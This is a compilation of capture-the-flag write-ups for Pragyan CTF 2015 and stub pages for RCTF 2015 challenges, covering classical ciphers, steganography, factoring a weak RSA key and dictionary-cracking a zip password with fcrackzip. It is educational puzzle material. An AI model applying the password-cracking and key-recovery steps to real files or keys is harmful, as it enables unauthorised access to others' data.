```bash
$ cat clue
\#greatest roman generals of all time
$ cat encrypt
ghowdirufhdwqlw
```

One of the "greatest roman generals of all time" is caesar, so maybe we have to do decrypt this ciphertext using the Caesar Rot cipher, e.g. using [rot.py](https://github.com/YASME-Tim/crypto-tools/tree/master/rot), lowercase only.

```bash
$ for i in {0..25}; do python rot.py $i ghowdirufhdwqlw; done
ghowdirufhdwqlw
hipxejsvgiexrmx
ijqyfktwhjfysny
jkrzgluxikgztoz
klsahmvyjlhaupa
lmtbinwzkmibvqb
mnucjoxalnjcwrc
novdkpybmokdxsd
opwelqzcnpleyte
pqxfmradoqmfzuf
qrygnsbeprngavg
rszhotcfqsohbwh
staipudgrtpicxi
tubjqvehsuqjdyj
uvckrwfitvrkezk
vwdlsxgjuwslfal
wxemtyhkvxtmgbm
xyfnuzilwyunhcn
yzgovajmxzvoido
zahpwbknyawpjep
abiqxclozbxqkfq
bcjrydmpacyrlgr
cdkszenqbdzsmhs
deltaforceatnit
efmubgpsdfbuoju
fgnvchqtegcvpkv
```

We see `deltaforceatnit`, which is the flag.

NOTE: The ROT value here is therefore `23`:

```bash
$ python rot.py 23 ghowdirufhdwqlw
deltaforceatnit
```

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/pragyan-ctf-2015-crypto-roman/>
# Pragyan CTF 2015: Rubies on Rails

**Category:** Cryptography
**Points:** 50
**Solves** 18
**Description:**

> [crypted.txt](crypted.txt)

## Write-up

by [polym](https://github.com/abpolym)

The ciphertext is encrypted using the [telephone keypad](http://en.wikipedia.org/wiki/Telephone_keypad):

![](keypad.png)

We decrypt this using [this code](https://github.com/YASME-Tim/crypto-tools/tree/master/handycode):

```bash
$ python handycode.py "$(cat crypted.txt)"
reestuisrtowebaoe
```

The title of this challenge, `Rubies on Rails`, hints that the railfence cipher is used. We can decrypt the ciphertext using an [online tool](http://rumkin.com/tools/cipher/railfence.php):

![](raildecrypt.png)

![](railrails.png)

![](railflag.png)

The flag is `rubiesaretoosweet`.

Thanks to the [Hexpresso CTF team](https://hexpresso.wordpress.com/)!

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: The Impossible

**Category:** Cryptography
**Points:** 50
**Solves** 43
**Description:**

> [question1.tar.gz](question1.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

We are given a ciphertext and a clue:

```bash
$ cat clue.py
#!/usr/bin/python

i = 1
while (i>0):
	print i
	i = i + 1

# i feel so sad for you if you couldn't find the clue :-(
$ cat encrypt
sfblvmlhyhpgrudnntagfxstbgxyk
```

The clue hints that we get the nth successor of the letter in the alphabet, depending on the index `n+1` of this ciphertext.

Proof of concept is `trans.py`:

```bash
$ python trans.py
thepassphraseisdeltaatpragyan
```

The flag is `deltaatpragyan`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Weak RSA

**Category:** Cryptography
**Points:** 100
**Solves** 28
**Description:**

> Sam wants to make his site secure using ssl. So he created his own RSA key pair and submitted a csr.
>
> Over time Sam feels that the traffic from his site is not secure and people tapping the network are reading his messages. He wants someone to verify the integrity of his encryption.
>
> The csr and a cipher are provided to you. Only you can help him ;)
>
> [foo](foo)

## Write-up

by [juanjohn](https://github.com/juanjohn)

Download the file and inspect it.

```bash
$ file foo
foo: xz compressed data
```
Its an xz compressed file. Extract using the built-in unxz utility.

```bash 
unxz < foo > foo2
```

Inspecting foo2 reveals its a tar file.

```bash
$ file foo2
rsa-unzipped: POSIX tar archive

$ tar vxf foo2
./rsa/
./rsa/cipher.enc
./rsa/domain.csr

```
We have the certificate signing request and the cipher text. We need to find some way to decode the cipher.
The public key can be obtained using openssl.

```bash
$ openssl req -in domain.csr -text -modulus -noout
Certificate Request:
    Data:
        Version: 0 (0x0)
        Subject: C=IN, ST=NITT, L=-, O=-, OU=-, CN=weakrsa.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (1024 bit)
                Modulus:
                    00:e8:95:38:49:f1:1e:93:2e:91:27:af:35:e1:00:
                    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
                    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
                    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
                    00:00:00:00:51:f8:eb:7d:05:56:e0:9f:ff:ff:ff:
                    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
                    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
                    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
                    ff:ff:ff:ff:ff:ff:fb:ad:55
                Exponent: 65537 (0x10001)
        Attributes:
            a0:00
    Signature Algorithm: sha256WithRSAEncryption
         7e:d8:a8:25:51:a1:9e:7b:b1:cc:05:87:18:fc:65:59:ba:db:
         07:d7:cd:95:00:6e:ae:d9:4b:ad:ab:f5:b5:7c:92:e8:c0:59:
         2d:11:df:61:c8:db:e4:f8:f7:e0:d2:7c:94:9a:80:49:20:ee:
         2f:3b:96:f0:4e:5f:ab:12:6d:6d:10:7e:39:e9:c8:35:33:71:
         86:d6:0e:30:6b:46:e6:d1:95:42:94:d9:75:6b:cf:10:b2:62:
         fa:56:4c:f9:60:07:84:cf:73:46:85:24:e1:37:9b:aa:84:70:
         b0:3c:4d:09:45:cb:b7:52:28:db:ca:35:6a:9b:22:d6:fc:89:
         25:0a
Modulus=E8953849F11E932E9127AF35E1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000051F8EB7D0556E09FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFBAD55
```

The title of the problem suggests the rsa is breakable. 

The modulus is a 1024 bit number and clearly does not factorise easily implying both the primes are large.
The public key exponent is also large. Another possibility is fermat's factorisation.

Fermat's factorisation using [`fermats_factorize.py`](https://github.com/juanjohn/rsa_tool/blob/master/fermats_factorizer.py) immediately spits out the two primes.

The private key is found using [`rsatool.py`](https://github.com/ius/rsatool/blob/master/rsatool.py) 

```bash
$python rsatool.py -p 12779877140635552275193974526927174906313992988726945426212616053383820179306398832891367199026816638983953765799977121840616466620283861630627224899027521 -q 12779877140635552275193974526927174906313992988726945426212616053383820179306398832891367199026816638983953765799977121840616466620283861630627224899026453 
Using (p, q) to initialise RSA instance

n =
e8953849f11e932e9127af35e1000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000051f8eb7d0556e09fffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
fffffffffffbad55

e = 65537 (0x10001)

d =
dbbb7e7e7d0a81cad0e0492c01f25a0da5f25a0da5f25a0da5f25a0da5f25a0da5f25a0da5f25a0d
a5f25a0da5f25a0da5f25a0da5f25a0da5f25a0da5f25a594a5dc42a5d15c1d73e28c1d73e28c1d7
3e28c1d73e28c1d73e28c1d73e28c1d73e28c1d73e28c1d73e28c1d73e28c1d73e28c1d73e28c1d7
3e28c1d73e24ac01

p =
f402bcfd15d8f0000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000241

q =
f402bcfd15d8efffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
fffffffffffffffffffffffffffffffffffffffffffffe15
```

We can now decrypt the base64 encoded cipher to read the message : 

"Congrats! The flag is too_close_primes"

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/Pragyan%202015/Weak%20RSA/36/)
# Pragyan CTF 2015: Access Code

**Category:** Forensics
**Points:** 30
**Solves** 28
**Description:**

> Find the access code
>
> [painter.pdf](painter.pdf)

## Write-up

by [polym](https://github.com/abpolym)

When opening the PDF, we see a censored image of a painting and an "encrypted code" and are told that the "KEYED" painter has the access code to this picture.

The encrypted code is `heitsctrnpsmysk` and we can extract the thumbnail of the picture using any carving tool, e.g `foremost` or `scalpel`:

![](General_Maximus01a.jpg)

After that, we see that the painter's name is [Sascha Herm](http://www.sascha-herm.com/Warlord_Games.htm) and that the picture is of `General Maximus`, a Roman general.

This implies that we have to search for a cipher to decrypt the encrypted code and detect the ["keyed" CAESAR cipher](http://rumkin.com/tools/cipher/caesar-keyed.php).

We decrypt the ciphertext using the painter's name as the key and get the flag:

![](keyed1.png)

![](keyed2.png)

Thanks to [@bbuerhaus](https://twitter.com/bbuerhaus) for the solution!

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: 255,255,255 is the best color

**Category:** Misc
**Points:** 50
**Solves** 27
**Description:**

> find the {flag}
>
> [misc-2](misc-2)

## Write-up

by [polym](https://github.com/abpolym)

Extracting the xz compressed archive using `unxz < misc-2 > here` and the resulting POSIX tar archive using `tar xvf here`, we get a file named `flag.txt`.

The file contains `307200` RGB values.

We visualize these RGB values and guess a picture format using [go.py](go.py):

```bash
$ python go.py flag.txt
```

The resulting picture is:

![](out.bmp)

At this point we guessed the flag `a_life_without_color`. The actual flag might be a different one (e.g. `a_life_without_coding`), since the challenge itself ["wasn't framed for perfection"](https://ctf.pragyan.org/home) and the points were given for similar flags.

The solution might have been bruteforcing the letters one by one by reversing the applied blurring effect.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Are you a good ripper?

**Category:** Misc
**Points:** 5
**Solves** 75
**Description:**

> the flag is right infront of u :P
>
> [misc](misc)

## Write-up

by [polym](https://github.com/abpolym)

After extracting the xz archive using `unxz < misc > here`, we are given a POSIX tar archive.

We unpack this archive with `tar xvf here` and get another archive, this time it is a zip archive named `misc.zip`.

If we try to `unzip` this archive, however, we are asked for a passphrase:

```bash
$ unzip misc.zip
Archive:  misc.zip
[misc.zip] flag.txt password:
```

We bruteforce the passphrase using a big list of passwords, e.g. [rockyou.txt](http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2), and `fcrackzip`:

```bash
$ fcrackzip -u -D -p "./rockyou.txt" misc.zip


PASSWORD FOUND!!!!: pw == jumanji
```

Now we just extract the archive and receive a file `flag.txt` containing the flag:

```bash
$ cat file.txt
4pesb9b9blkfc08e3z2105b1b6bfif45
```

The flag is `4pesb9b9blkfc08e3z2105b1b6bfif45`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Practice Flag

**Category:** Misc
**Points:** 0
**Solves** 192
**Description:**

> What is CTF?
> 
> Hint! The answer starts with "capture the"

## Write-up

The flag is `capture the flag`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Totally Abstruse

**Category:** Misc
**Points:** 30
**Solves** 44
**Description:**

> no point guessing
>
> [world.png](world.png)

## Write-up

by [polym](https://github.com/abpolym)

The picture is a Piet program. We can execute it using [npiet](http://www.bertnase.de/npiet/):

```bash
$ npiet world.png
Hello, World!
```

The flag is `Hello, World!`.

Thanks to Notfound of the [Hexpresso Team](https://hexpresso.wordpress.com/) for the solution!

## Other write-ups and resources

* none yet
# Pragyan CTF 2015 write-ups

* <https://ctf.pragyan.org/home>
* [Scoreboard](https://ctf.pragyan.org/scores)
* Participants: 269 (out of which 159 have more than 0 points)

## Completed write-ups

* [android/fast_and_furious](android/fast_and_furious)
* [android/hackerz](android/hackerz)
* [crypto/crack_this](crypto/crack_this)
* [crypto/haunted_1s](crypto/haunted_1s)
* [crypto/one_more_headache](crypto/one_more_headache)
* [crypto/roman](crypto/roman)
* [crypto/rubies_on_rails](crypto/rubies_on_rails)
* [crypto/the_impossible](crypto/the_impossible)
* [crypto/weak_rsa](crypto/weak_rsa)
* [forensics/access_code](forensics/access_code)
* [misc/255_255_255_is_the_best_color](misc/255_255_255_is_the_best_color)
* [misc/are_you_a_good_ripper](misc/are_you_a_good_ripper)
* [misc/practice_flag](misc/practice_flag)
* [misc/totally_abstruse](misc/totally_abstruse)
* [stegano/dont_stop](stegano/dont_stop)
* [stegano/emma_watson](stegano/emma_watson)
* [stegano/put_on_your_reading_glasses](stegano/put_on_your_reading_glasses)
* [stegano/something_is_different](stegano/something_is_different)
* [stegano/what_you_see_is_what_you_get](stegano/what_you_see_is_what_you_get)
* [web/find_the_flag](web/find_the_flag)

## External write-ups only

* none yet

## Missing write-ups# Pragyan CTF 2015: Don't Stop

**Category:** Steganography
**Points:** 5
**Solves** 98
**Description:**

> Keep looking
>
> [Proxy.jpg](Proxy.jpg)

## Write-up

by [polym](https://github.com/abpolym)

We are given a picture:

![](Proxy.jpg)

The first thing we do is `strings -a Proxy.jpg`:

```bash
$ strings -a Proxy.jpg
Ducky
Adobe
57RCv9
[...]
1Z5;"A
kjiFF
16bbee7466db38dad50701223d57ace8
```

There is a md5 hash sum `16bbee7466db38dad50701223d57ace8`, which also is the flag.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Emma Watson

**Category:** Steganography
**Points:** 100
**Solves** 28
**Description:**

> [the_bling_ring.png](the_bling_ring.png)

## Write-up

by [polym](https://github.com/abpolym)

We are given a picture of Emma Watson:

![](the_bling_ring.png)

We notice a stream of pixels in the first row of the picture and extract the information using `carve.py` and `this.bmp`:

```bash
$ python carve.py
010101000110100001100101010111110110001001100101011000010111010101110100011110010101111101101111011001100101111101110000011000010111001001100001011001000110100101110011011001010101111101101001011100110101010001101000011001010101111101100010011001010110000101110101011101000111100101011111011011110110011001011111011100000110000101110010011000010110010001101001011100110110010101011111011010010111001101010100011010000110010101011111011000100110010101100001011101010111
```

After that, we just decode this binary string to an ASCII string:

```bash
$ python carve.py | perl -lpe '$_=pack"B*",$_'
The_beauty_of_paradise_isThe_beauty_of_paradise_isThe_beaup
```

The flag is `The_beauty_of_paradise_is`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Put on your reading glasses

**Category:** Steganography
**Points:** 10
**Solves** 102
**Description:**

> Put on your reading glasses to find the answer
>
> [test.html](test.html)

## Write-up

by [polym](https://github.com/abpolym)

Opening the `test.html` file with a web-browser of your choice, we see a blank page.

Further inspection yields that there are several blocks with RGB background colors of either `rgb(255, 255, 254)` or `rgb(255, 255, 255)`.

Since we can't differentiate these values with our own eyes, we replace the `255,255,254` values with `0,0,0` - the color black:

```bash
cat test.html | sed 's/rgb(255, 255, 254)/rgb(0,0,0)/g' > test2.html
```

Opening this new HTML page, `test2.html`, we get a QR code:

![](qrcode.png)

Decoding this QR Code with an [online tool](http://zxing.org/w/decode.jspx) yields the flag, `8febb919bc0fc08e3e1108b1b6bfef37`.

## Other write-ups and resources

 none yet
# Pragyan CTF 2015: Something is different

**Category:** Steganography
**Points:** 100
**Solves** 26
**Description:**

> Hint! just look at the difference
>
> [modified.png](modified.png)

## Write-up

by [polym](https://github.com/abpolym)

We are given a picture of pi and the first `20590` decimal places.

Using an [online OCR tool](http://www.free-ocr.com/), we get the textual representation of this picture.

We notice on the one hand that some digits are different and on the other hand that the replaced digits form a triangle:

![](a.png)

vs

![](b.png)

The flag is `triangle`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: What you see is what you get.

**Category:** Steganography
**Points:** 50
**Solves** 87
**Description:**

> Find and submit the {flag}
>
> [stego_50.jpg](stego_50.jpg)

## Write-up

by [polym](https://github.com/abpolym)

using `binwalk`, we see that the provided picture contains a zip archive:

```bash
$ binwalk stego_50.jpg
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard  1.02
10541         0x292D          Zip archive data, at least v1.0 to extract, compressed size: 37,  uncompressed size: 37, name: "usethis"
10720         0x29E0          End of Zip archive
```

We extract this archive using `binwalk -e stego\_50.jpg` and get a zip archive, which contains a txt file named `usethis`:

```bash
$ cat usethis
steghide.sourceforge.net/download.php
```

So we use `steghide` to extract additional hidden data in the picture:

```bash
$ steghide extract -sf stego_50.jpg
Enter Passphrase: 
```

We get the passphrase using `strings -a stego\_50.jpg`
```bash
$ strings -a stego_50.jpg
JFIF
  %*5-%'2(  .?/279<<<$-BFA:F5;<9
  9& &99999999999999999999999999999999999999999999999999
[...]
RP!h
usethisUT
steghide.sourceforge.net/download.phpPK
usethisUT
Delta_Force\m/
```

The passphrase to extract data using `steghide` is `Delta\_Force\m/`:


```bash
$ steghide extract -sf stego_50.jpg
Enter Passphrase: (Delta_Force\m/)
wrote extracted data to "key_stego_1"
$ cat key_stego_1
Congrats! This was way too wasy :P

This is the key:

PrAgyaNCTF_sTeg1_key
```

The flag is `PrAgyaNCTF_sTeg1_key`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Find the flag

**Category:** Web
**Points:** 20
**Solves** 104
**Description:**

> [ctf.zip](ctf.zip)

## Write-up

by [polym](https://github.com/abpolym)

Unzipping the archive with `unzip ctf.zip`, we get a bunch of javascript and css files, as well as a PNG.

The first thing we do is trying to find the string `flag` using `grep`:

```bash
$ grep -ri flag ctf
ctf/aes.js:l)}})();$(document).ready(function() { $('#flag').html("904d553eae0a2a5b82d82fd4f0c7ae6f5fe955f5"); });CryptoJS.lib.Cipher||function(u){var p=CryptoJS,d=p.lib,l=d.Base,s=d.WordArray,t=d.BufferedBlockAlgorithm,r=p.enc.Base64,w=p.algo.EvpKDF,v=d.Cipher=t.extend({cfg:l.extend(),createEncryptor:function(e,a){return this.create(this._ENC_XFORM_MODE,e,a)},createDecryptor:function(e,a){return this.create(this._DEC_XFORM_MODE,e,a)},init:function(e,a,b){this.cfg=this.cfg.extend(b);this._xformMode=e;this._key=a;this.reset()},reset:function(){t.reset.call(this);this._doReset()},process:function(e){this._append(e);return this._process()},
ctf/gumby.css:.icon-flag.icon-left a:before, .icon-flag.icon-right a:after, i.icon-flag:before { content: "\\2691"; height: inherit; }
```

We see a SHA1 hash sum, `904d553eae0a2a5b82d82fd4f0c7ae6f5fe955f5`, which is also the flag.

NOTE: `904d553eae0a2a5b82d82fd4f0c7ae6f5fe955f5` is the hashsum of `39giraffes`. [Source](http://www.hashkiller.co.uk/sha1-decrypter.aspx).

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/pragyan-ctf-2015-web-1/>
# 2015 RCTF QUALS 2015: asm

**Category:** Crypto
**Points:** 200
**Solves:** 23
**Description:**

> Decrypt
> 
> 
> [asm_346618f012bfdd78c4428e824461d10f](./asm_346618f012bfdd78c4428e824461d10f)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: decode the file

**Category:** Crypto
**Points:** 100
**Solves:** 29
**Description:**

> decode the file(this flag is like ROIS{xxx}
> 
> 
> [cip_d0283b2c5b4b87423e350f8640a0001e](./cip_d0283b2c5b4b87423e350f8640a0001e)


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/2108>
* <http://insight-labs.org/?p=2017>
* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: x xor md5

**Category:** Crypto
**Points:** 100
**Solves:** 30
**Description:**

> "key" is not presented
> 
> 
> [xmd5_b86e130087cb2b49cbb3b87a784eac28](./xmd5_b86e130087cb2b49cbb3b87a784eac28)


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/2110>
* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: Analysis nginx‘s log

**Category:** Misc
**Points:** 50
**Solves:** 257
**Description:**

> Analysis nginx's log(this flag is like ROIS{xxx}
> 
> 
> [log_d30afe96202aafae7c0a1ecc123c0584](./log_d30afe96202aafae7c0a1ecc123c0584)


## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.jclariviere.com/posts/ctf-writeup-rctf-2015-quals-analysis-nginx-log/>
* <https://b01lers.net/challenges/RCTF%202015/Analysis%20nginx%E2%80%98s%20log/74/>
* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: Caesar deformation

**Category:** Misc
**Points:** 100
**Solves:** 2
**Description:**

> you just only brute force it.(The flag should include RCTF{})
> 
> 
> hint 1: maybe not 8 bit combine a char
> 
> hin2: I don't know how long of strings be shifted but I know strings printable. I don't know how many steps be shifted also.
> 
> 
> [benefit_b4aea98a6f42c3ff3c7e6a3632f5d789](./benefit_b4aea98a6f42c3ff3c7e6a3632f5d789)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: I can't hear that

**Category:** Misc
**Points:** 150
**Solves:** 9
**Description:**

> The Flag should include RCTF{}
> 
> 
> [wav_4bda4933646d3ce6ceedcdb1e5f982d8](./wav_4bda4933646d3ce6ceedcdb1e5f982d8)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: QQ

**Category:** Misc
**Points:** 200
**Solves:** 2
**Description:**

> Open Your Brain
> 
> 
> [qq_e3b983843b23384cfa787133ca50dd6e](./qq_e3b983843b23384cfa787133ca50dd6e)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: sign in

**Category:** Misc
**Points:** 10
**Solves:** 412
**Description:**

> "you should know that flag format is RCTF{}"
> 
> <http://roisfzu.org:8998/funny>


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: Flag system

**Category:** Mobile
**Points:** 100
**Solves:** 38
**Description:**

> Show me the flag. (The flag should include RCTF{})
> 
> 
> [ab_2e204fe0ec33b1689f1c47bd60a9770c](./ab_2e204fe0ec33b1689f1c47bd60a9770c)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://www.purpleroc.com/md/RCTF-WriteUp.html)
* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://drops.wooyun.org/mobile/10557)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: Load

**Category:** Mobile
**Points:** 350
**Solves:** 0
**Description:**

> This APK has a vulnerability,Can you load the flag? Try it.
> 
> 
> hint:exposed component vulnerability
> 
> 
> [WaWaWa_0bb98521a9f21cc3672774cfec9c7140](./WaWaWa_0bb98521a9f21cc3672774cfec9c7140)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://drops.wooyun.org/mobile/10557)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: Target

**Category:** Mobile
**Points:** 450
**Solves:** 0
**Description:**

> This APK has a vulnerability, please use it to start the target activity.The flag should include RCTF{}
> 
> 
> [Package_b6411947d3b360182e8897be40064023](./Package_b6411947d3b360182e8897be40064023)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://drops.wooyun.org/mobile/10557)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: Where

**Category:** Mobile
**Points:** 300
**Solves:** 10
**Description:**

> Where is the flag.(The flag should include RCTF{})
> 
> 
> hint:where is body
> 
> hint2: the KEY is visible strings, -k -nosalt
> 
> 
> [misc_5b0a7ae29fe01c7a76a19503e1e0273e](./misc_5b0a7ae29fe01c7a76a19503e1e0273e)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://drops.wooyun.org/mobile/10557)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: g27

**Category:** Pwn
**Points:** 500
**Solves:** 12
**Description:**

> nc 59.77.135.197 9001
> 
> 
> [g27_9f47c9e9d3e7605f3bbdd4f92e51250d](./g27_9f47c9e9d3e7605f3bbdd4f92e51250d)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
* <http://pastebin.com/Sdey69ns>
# 2015 RCTF QUALS 2015: keys

**Category:** Pwn
**Points:** 600
**Solves:** 4
**Description:**

> It's a router service.
> 
> nc 59.77.135.196 20006
> 
> 
> [keys_dae2262f9871acb2b011126a3180f888](./keys_dae2262f9871acb2b011126a3180f888)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: nobug

**Category:** Pwn
**Points:** 300
**Solves:** 43
**Description:**

> nc 180.76.178.48 8888
> 
> 
> [nobug_acc0c1b37bec49e0575c94a3916cc771](./nobug_acc0c1b37bec49e0575c94a3916cc771)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/detail/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
* <http://blog.albertchang.cn/wp-content/uploads/2015/11/Nu1L_RCTF_Writeup.pdf>
* <http://pastebin.com/dykTGSJN>
* <http://pastebin.com/GPtxi3yG>
# 2015 RCTF QUALS 2015: shaxian

**Category:** Pwn
**Points:** 400
**Solves:** 7
**Description:**

> nc 180.76.178.48 23333
> 
> 
> [shaxian_51f320b11793463ecdcfbb0c015cc273](./shaxian_51f320b11793463ecdcfbb0c015cc273)


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://ww9210.cn/2015/11/18/rctf-pwn400-shaxian-writeup/)
* [Chinese](http://bobao.360.cn/ctf/detail/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
* <http://bigtang.org/2015/11/17/RCTF-2015-Quals-pwn400/>
* <http://pastebin.com/GPtxi3yG>
# 2015 RCTF QUALS 2015: welpwn

**Category:** Pwn
**Points:** 200
**Solves:** 68
**Description:**

> nc 180.76.178.48 6666
> 
> 
> [welpwn_932a4428ea8d4581431502ab7e66ea4b](./welpwn_932a4428ea8d4581431502ab7e66ea4b)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/rctf-2015-pwn-200/>
* [Chinese](http://blog.albertchang.cn/wp-content/uploads/2015/11/Nu1L_RCTF_Writeup.pdf)
* [Chinese](http://www.purpleroc.com/md/RCTF-WriteUp.html)
* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS write-ups

* <http://roisfzu.org:8998/>
* [Scoreboard](http://roisfzu.org:8998/scoreboard) or [local alternative](./scoreboard)
* Tip: Use the chinese search engine to find writeups [souwangpan](http://www.souwangpan.cn/?q=rctf+write+up)

## Completed write-ups

* none yet

## External write-ups only

* [crypto/asm](crypto/asm)
* [crypto/decode-the-file](crypto/decode-the-file)
* [crypto/x-xor-md5](crypto/x-xor-md5)
* [misc/analysis-nginxs-log](misc/analysis-nginxs-log)
* [misc/caesar-deformation](misc/caesar-deformation)
* [misc/i-cant-hear-that](misc/i-cant-hear-that)
* [misc/qq](misc/qq)
* [misc/sign-in](misc/sign-in)
* [mobile/flag-system](mobile/flag-system)
* [mobile/load](mobile/load)
* [mobile/target](mobile/target)
* [mobile/where](mobile/where)
* [pwn/g27](pwn/g27)
* [pwn/keys](pwn/keys)
* [pwn/nobug](pwn/nobug)
* [pwn/shaxian](pwn/shaxian)
* [pwn/welpwn](pwn/welpwn)
* [reverse/crack-me](reverse/crack-me)
* [reverse/not-sequence](reverse/not-sequence)
* [reverse/old-driver](reverse/old-driver)
* [reverse/tank](reverse/tank)
* [reverse/vb](reverse/vb)
* [survey/survey](survey/survey)
* [web/comprehensive](web/comprehensive)
* [web/easysql](web/easysql)
* [web/login](web/login)
* [web/upload](web/upload)
* [web/weeeeeb3](web/weeeeeb3)
* [web/xss](web/xss)

## Missing write-ups# 2015 RCTF QUALS 2015: crack me

**Category:** Reverse
**Points:** 300
**Solves:** 21
**Description:**

> winer crack
> 
> the flag should include RCTF{}
> 
> 
> [crackMe_aafb0addeb58dece1fcf631a183c2b20](./crackMe_aafb0addeb58dece1fcf631a183c2b20)


## Write-up

(TODO)

## Other write-ups and resources

* <http://insight-labs.org/?p=2009>
* [Chinese](https://www.iret.xyz/article.aspx/rctf2015_reverse)
* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://www.purpleroc.com/md/RCTF-WriteUp.html)
* [Chinese](http://www.heysec.org/archives/85)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: not sequence

**Category:** Reverse
**Points:** 100
**Solves:** 57
**Description:**

> The sequence is not a sequence But RE is RE
> 
> 
> hint: there is no negative number in what you input
> 
> 
> [fixed_neoyang_1510eb9338f00991c2d273e12df236bb](./fixed_neoyang_1510eb9338f00991c2d273e12df236bb)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](https://www.iret.xyz/article.aspx/rctf2015_reverse)
* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://www.purpleroc.com/md/RCTF-WriteUp.html)
* [Chinese](http://www.heysec.org/archives/85)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: Old Driver

**Category:** Reverse
**Points:** 400
**Solves:** 3
**Description:**

> Old Driver bring you to Be 13 and bring you to fly
> 
> the flag should include RCTF{}
> 
> 
> hint: be careful
> 
> 
